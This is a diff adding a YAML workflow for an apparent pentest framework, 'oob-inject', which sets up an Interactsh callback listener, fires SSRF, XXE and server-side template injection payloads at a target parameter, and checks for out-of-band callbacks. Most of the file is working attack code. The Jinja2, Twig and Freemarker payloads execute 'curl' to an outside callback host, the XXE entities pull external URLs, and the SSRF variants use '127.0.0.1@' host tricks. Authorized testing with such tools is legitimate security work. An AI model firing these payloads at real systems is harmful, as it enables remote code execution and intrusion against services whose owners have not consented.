@@ -1,0 +1,199 @@
+name: oob-inject
+description: |
+  Out-of-band injection tester — set up Interactsh callbacks, inject
+  SSRF/XXE/SSTI payloads into a target parameter, and verify which
+  injections triggered OOB interactions.
+tags: [web, oob, ssrf, xxe, ssti, interactsh]
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target URL (e.g. https://app.example.com/api)
+      alias: t
+    param:
+      required: true
+      type: string
+      description: Vulnerable parameter name to inject into
+    payloads:
+      type: string
+      default: ssrf
+      description: "Injection type: ssrf, xxe, ssti, or all"
+
+jobs:
+  setup:
+    name: Setup OOB Listener
+    outputs:
+      callback_url: "{{ steps.init-listener.outputs.callback_url }}"
+      callback_flag: "{{ steps.init-listener.outputs.callback_flag }}"
+      callback_domain: "{{ steps.init-listener.outputs.callback_domain }}"
+    steps:
+    - name: init-listener
+      timeout: 3
+      continue-on-error: true
+      script: |
+        from ofx.api.oob import Interactsh
+
+        print("[*] Registering Interactsh listener ...")
+        client = Interactsh()
+        client.register()
+
+        url, flag = client.build_request(length=12, method="http")
+        dns_url, dns_flag = client.build_request(length=12, method="dns")
+
+        print(f"[+] HTTP callback: {url}")
+        print(f"[+] DNS callback:  {dns_url}")
+        print(f"[+] Domain:        {client.domain}")
+        print(f"[+] Tracking flag: {flag}")
+
+        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
+            f.write(f"callback_url={url}\n")
+            f.write(f"callback_flag={flag}\n")
+            f.write(f"callback_domain={client.domain}\n")
+
+  inject:
+    name: Inject Payloads
+    needs: [setup]
+    outputs:
+      injection_count: "{{ steps.send-injections.outputs.injection_count }}"
+      payloads_file: "{{ steps.send-injections.outputs.payloads_file }}"
+    steps:
+    - name: send-injections
+      timeout: 5
+      continue-on-error: true
+      script: |
+        from ofx.api.http import get_http_client
+        import time
+        import json
+
+        target = "{{ inputs.target }}"
+        param = "{{ inputs.param }}"
+        payload_type = "{{ inputs.payloads }}".lower()
+        callback_url = "{{ jobs.setup.outputs.callback_url }}"
+        callback_domain = "{{ jobs.setup.outputs.callback_domain }}"
+
+        if not target.startswith("http"):
+            target = f"https://{target}"
+
+        # Build payload sets
+        payloads = []
+
+        if payload_type in ("ssrf", "all"):
+            payloads.extend([
+                ("ssrf-direct", callback_url),
+                ("ssrf-redirect", f"http://127.0.0.1@{callback_domain}"),
+                ("ssrf-encoded", callback_url.replace("://", "%3A%2F%2F")),
+            ])
+
+        if payload_type in ("xxe", "all"):
+            xxe_payload = (
+                '<?xml version="1.0"?><!DOCTYPE foo ['
+                f'<!ENTITY xxe SYSTEM "{callback_url}">]>'
+                '<foo>&xxe;</foo>'
+            )
+            payloads.extend([
+                ("xxe-entity", xxe_payload),
+                ("xxe-param", f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>'),
+            ])
+
+        if payload_type in ("ssti", "all"):
+            payloads.extend([
+                ("ssti-jinja2", "{{" + f"config.__class__.__init__.__globals__['os'].popen('curl {callback_url}').read()" + "}}"),
+                ("ssti-twig", "{{" + f"'/usr/bin/curl'|filter('exec','{callback_url}')" + "}}"),
+                ("ssti-freemarker", f'${{" freemarker.template.utility.Execute"?new()("curl {callback_url}")}}'),
+            ])
+
+        client = get_http_client(timeout=10)
+        sent = 0
+        results = []
+
+        print(f"[*] Injecting {len(payloads)} payloads into {param} @ {target}")
+        for name, payload in payloads:
+            try:
+                # GET injection
+                resp = client.get(
+                    target,
+                    params={param: payload},
+                    follow_redirects=False,
+                )
+                results.append({"name": name, "method": "GET", "status": resp.status_code})
+                print(f"  [{resp.status_code}] GET  {name}")
+                sent += 1
+            except Exception as e:
+                print(f"  [ERR] GET  {name} -> {e}")
+                sent += 1
+
+            try:
+                # POST injection
+                resp = client.post(
+                    target,
+                    data={param: payload},
+                    follow_redirects=False,
+                )
+                results.append({"name": name, "method": "POST", "status": resp.status_code})
+                print(f"  [{resp.status_code}] POST {name}")
+                sent += 1
+            except Exception as e:
+                print(f"  [ERR] POST {name} -> {e}")
+                sent += 1
+
+            time.sleep(0.3)
+
+        out_file = "/tmp/ofx_oob_payloads.json"
+        with open(out_file, "w") as f:
+            json.dump(results, f, indent=2)
+
+        print(f"\n[+] Sent {sent} injection requests")
+        print("[*] Waiting 15s for OOB callbacks to register ...")
+        time.sleep(15)
+
+        with open("{{ env.OFX_OUTPUTS }}", "a") as f:
+            f.write(f"injection_count={sent}\n")
+            f.write(f"payloads_file={out_file}\n")
+
+  verify:
+    name: Verify Callbacks
+    needs: [setup, inject]
+    steps:
+    - name: poll-interactions
+      timeout: 3
+      continue-on-error: true
+      script: |
+        from ofx.api.oob import Interactsh
+
+        callback_flag = "{{ jobs.setup.outputs.callback_flag }}"
+        injection_count = "{{ jobs.inject.outputs.injection_count }}"
+
+        print("[*] Polling Interactsh for OOB interactions ...")
+
+        client = Interactsh()
+        client.register()
+
+        found, results = client.verify(callback_flag, get_result=True)
+
+        print("=" * 60)
+        print(" OOB INJECTION RESULTS")
+        print(f" Target: {{ inputs.target }}")
+        print(f" Parameter: {{ inputs.param }}")
+        print(f" Type: {{ inputs.payloads }}")
+        print("=" * 60)
+
+        print(f"\n  Injections sent: {injection_count}")
+
+        if found:
+            print(f"  [+] OOB INTERACTIONS DETECTED: {len(results)}")
+            for i, r in enumerate(results[:20]):
+                print(f"\n  --- Interaction {i + 1} ---")
+                if isinstance(r, dict):
+                    for k, v in r.items():
+                        print(f"    {k}: {str(v)[:100]}")
+                else:
+                    print(f"    {str(r)[:200]}")
+
+            print(f"\n[!] VULNERABLE — target triggered {len(results)} OOB callback(s)")
+            print("    The injected parameter is processing external URLs/entities")
+        else:
+            print("  [-] No OOB interactions detected")
+            print("    The target may not be vulnerable, or callbacks were blocked")
+            print("    Consider testing with different payload types or parameters")
+      log-stdout: true
